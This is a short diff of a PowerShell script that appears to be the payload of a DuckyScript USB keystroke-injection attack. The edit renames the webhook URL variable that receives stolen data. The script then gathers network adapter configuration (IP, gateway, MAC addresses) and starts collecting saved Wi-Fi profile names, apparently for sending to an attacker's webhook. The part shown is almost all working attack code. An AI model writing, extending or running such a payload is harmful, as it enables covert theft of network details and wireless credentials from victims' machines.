@@ -8,9 +8,8 @@
 #  #+#+# #+#+#      #+#     #+#        #+#        
 #   ###   ###   ########### ########## ##########
 
-# the $wh variable is defined in the duckyscript
-
-if (([string]::IsNullOrEmpty("$wh"))) {exit}
+$webhookUrl = "$wh"
+if (([string]::IsNullOrEmpty("$webhookUrl"))) {exit}
 
 $Network = Get-WmiObject Win32_NetworkAdapterConfiguration | where { $_.MACAddress -notlike $null } | select Index, Description, IPAddress, DefaultIPGateway, MACAddress | Format-Table Index, Description, IPAddress, DefaultIPGateway, MACAddress 
 $WLANProfileNames = @()
